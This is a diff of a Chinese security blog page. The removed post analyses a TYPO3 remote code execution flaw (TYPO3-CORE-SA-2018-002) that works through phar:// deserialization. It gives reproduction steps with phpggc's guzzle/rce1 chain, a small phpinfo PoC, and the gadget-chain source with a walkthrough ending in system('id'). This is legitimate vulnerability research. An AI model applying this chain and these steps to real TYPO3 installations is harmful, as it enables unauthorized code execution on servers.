-<p>本地搭建了两个基于Ubuntu 18.04.2 LTS的测试环境，TYPO3 8.7.16+PHP PHP 7.0.33和TYPO3 9.3.0+7.3.7。该漏洞的触发需要一个有效的后台用户。</p>
-<p>这里有一个问题需要知晓，<code>assert</code>函数在PHP7.2之后的定义与之前版本略有不同。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br></pre></td></tr></table></figure>
-
-<p>php manual中有一段话：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning</span><br><span class="line">Using string as the assertion is DEPRECATED as of PHP 7.2.</span><br></pre></td></tr></table></figure>
-
-<p>这在编写POC的时候，需要避免在PHP7.3中使用<code>assert</code>来执行代码。</p>
-<p>PHP7.3.7中执行<code>phpinfo</code>使用的poc如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = <span class="string">"phpinfo"</span>;</span><br><span class="line">    $value = <span class="number">1</span>;</span><br><span class="line">    call_user_func($filter,$value);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>好了，现在开始进行漏洞分析。</p>
-<p>TYPO3中存在漏洞的代码在<code>typo3/sysext/core/Classes/Database/SoftReferenceIndex.php</code>的<code>getTypoLinkParts()</code>方法</p>
-<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/file_exitst.png" alt="label"></p>
-<p>上面说到存在风险的文件操作函数，其中就包括<code>file_exists()</code>，当传给<code>file_exists()</code>的参数是<code>phar</code>压缩文档并通过<code>phar://</code>伪协议解析时，就会反序列化其中的<code>metadata</code>数据，一旦该数据被控制，就会形成漏洞。</p>
-<p>我们可以构造<code>$splitLinkParam</code>参数为<code>phar</code>文件，其中包含恶意代码，传递给<code>file_exists()</code>函数，便会触发漏洞。</p>
-<p>在这里，利用<code>phpggc</code>来构造POP链。TYPO3中包含类<code>FnStream</code>,所以可以利用<code>phpggc</code>中的<code>guzzle/rce1</code>载荷将数据写入一张图片中。</p>
-<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/phpggc.png" alt="label"></p>
-<p>然后上传这个附件，接着创建一个页面，将 Link 设置为<code>phar://</code>，注意需要将<code>:</code>转义</p>
-<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/typo3_1.png" alt="label"></p>
-<p>保存后就会触发漏洞</p>
-<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/typo3_2.png" alt="label"></p>
-<p>漏洞复现完毕。</p>
-<p>最后说一下<code>phpggc</code>中该POP调用链。</p>
-<p>在PHPGGC中，pop链在<code>gadgets.php</code>文件中，pop链的逻辑和描述在<code>chain.php</code>文件中<br><code>chain.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Guzzle</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE1</span> <span class="keyword">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">RCE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $version = <span class="string">'6.0.0 &lt;= 6.3.2'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $vector = <span class="string">'__destruct'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $author = <span class="string">'proclnas'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $informations = <span class="string">'</span></span><br><span class="line"><span class="string">        This chain requires GuzzleHttp\Psr7 &lt; 1.5.0, because FnStream cannot be</span></span><br><span class="line"><span class="string">        deserialized afterwards.</span></span><br><span class="line"><span class="string">        See https://github.com/ambionics/phpggc/issues/34</span></span><br><span class="line"><span class="string">    '</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">(array $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = $parameters[<span class="string">'function'</span>];</span><br><span class="line">        $parameter = $parameters[<span class="string">'parameter'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> \GuzzleHttp\Psr7\FnStream([</span><br><span class="line">            <span class="string">'close'</span> =&gt; [</span><br><span class="line">                <span class="keyword">new</span> \GuzzleHttp\HandlerStack($function, $parameter),</span><br><span class="line">                <span class="string">'resolve'</span></span><br><span class="line">            ]</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从其中可以看到其对使用该组件的描述，要求<code>GuzzleHttp\Psr7</code>的版本要小于1.5.0，具体的逻辑在<code>generate</code>成员方法中，其中入口参数为数组parameters，其包括function和parameter两个参数，分别为要进行rce的函数和函数的参数，其返回的即是<code>\GuzzleHttp\Psr7\FnStream</code>的匿名对象，其入口参数为一个数组，数组包括一个数组元素，键名为close，键值为一个数组，包括<code>\GuzzleHttp\HandlerStack</code>匿名对象，以及<code>resolve</code>字符串，至此构造序列化对象的逻辑结束，接下来结合<code>gadgets.php</code>看一下整个链是如何连起来的:</p>
-<p><code>gadgets.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Psr</span>\<span class="title">Http</span>\<span class="title">Message</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">StreamInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">FnStream</span> <span class="title">implements</span> \<span class="title">Psr</span>\<span class="title">Http</span>\<span class="title">Message</span>\<span class="title">StreamInterface</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="title">private</span> $<span class="title">methods</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $methods)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;methods = $methods;</span><br><span class="line"></span><br><span class="line">	        <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $name =&gt; $fn) &#123;</span><br><span class="line">	            <span class="keyword">$this</span>-&gt;&#123;<span class="string">'_fn_'</span> . $name&#125; = $fn;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	    public function __destruct()</span></span><br><span class="line"><span class="comment">	    &#123;</span></span><br><span class="line"><span class="comment">	        if (isset($this-&gt;_fn_close)) &#123;</span></span><br><span class="line"><span class="comment">	            call_user_func($this-&gt;_fn_close);</span></span><br><span class="line"><span class="comment">	        &#125;</span></span><br><span class="line"><span class="comment">	    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	    public function close()</span></span><br><span class="line"><span class="comment">	    &#123;</span></span><br><span class="line"><span class="comment">	        return call_user_func($this-&gt;_fn_close);</span></span><br><span class="line"><span class="comment">	    &#125;</span></span><br><span class="line"><span class="comment">	    */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">HandlerStack</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="title">private</span> $<span class="title">handler</span>;</span><br><span class="line">	    <span class="keyword">private</span> $stack;</span><br><span class="line">	    <span class="keyword">private</span> $cached = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($function, $parameter)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	    	<span class="keyword">$this</span>-&gt;stack = [[$function]];</span><br><span class="line">	    	<span class="keyword">$this</span>-&gt;handler = $parameter;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	    public function resolve()</span></span><br><span class="line"><span class="comment">	    &#123;</span></span><br><span class="line"><span class="comment">	        if (!$this-&gt;cached) &#123;</span></span><br><span class="line"><span class="comment">	            if (!($prev = $this-&gt;handler)) &#123;</span></span><br><span class="line"><span class="comment">	                throw new \LogicException('No handler has been specified');</span></span><br><span class="line"><span class="comment">	            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	            foreach (array_reverse($this-&gt;stack) as $fn) &#123;</span></span><br><span class="line"><span class="comment">	                $prev = $fn[0]($prev);</span></span><br><span class="line"><span class="comment">	            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	            $this-&gt;cached = $prev;</span></span><br><span class="line"><span class="comment">	        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	        return $this-&gt;cached;</span></span><br><span class="line"><span class="comment">	    &#125;</span></span><br><span class="line"><span class="comment">	    */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在类HandlerStack的构造方法中传入了rce要使用的函数及参数，并赋值给<code>$this-&gt;stack</code>和<code>$this-&gt;handler</code>，然后在类<code>FnStream</code>的构造方法中传入包含键<code>close</code>的数组，此时将会拼接出:<code>_fn_close=[new\GuzzleHttp\HandlerStack($function, $parameter),&#39;resolve&#39;]</code><br><code>_fn_close</code>的第一个元素其实已经实例化为一个匿名对象了，这里为了好理解先写成实例化前的形式。然后在FnStream的<code>__destruct()</code>函数中将会调用<code>$this-&gt;_fn_close</code>，即构成：<br><code>call_user_func([new \GuzzleHttp\HandlerStack($function, $parameter),&#39;resolve&#39;])</code><br>以上这种调用的形式在php官方文档中存在此种调用类中方法的形式：</p>
-<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/call_user_func.png" alt="label"></p>
-<p>所以此时关注类<code>HandlerStack</code>的<code>resolve</code>方法,其中将利用php的动态函数的性质来构成rce的函数调用，比如此时假设：<br><code>[new \GuzzleHttp\HandlerStack($function, $parameter),&#39;resolve&#39;]=&gt;
-[new \GuzzleHttp\HandlerStack(&quot;system&quot;, &quot;id&quot;),&#39;resolve&#39;]</code>即此时<code>$prev</code>参数首先经过<code>$prev = $this-&gt;handler</code>以后为id，接着经过foreach <code>(array_reverse($this-&gt;stack) as $fn)</code>，<code>$fn</code>将为包含一个元素的数组<code>[&quot;system&quot;]</code>,然后经过<code>$fn[0]</code>即为<code>system</code>，即<code>$prev</code>即为<code>system(&quot;id&quot;)</code>;最后函数调用返回再传入<code>call_user_func，即构成call_user_func(system(&quot;id&quot;))</code>;<br>        到此，整个调用链已经分析结束，实现的原理也清楚了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1650,7 +1695,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1663,7 +1708,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
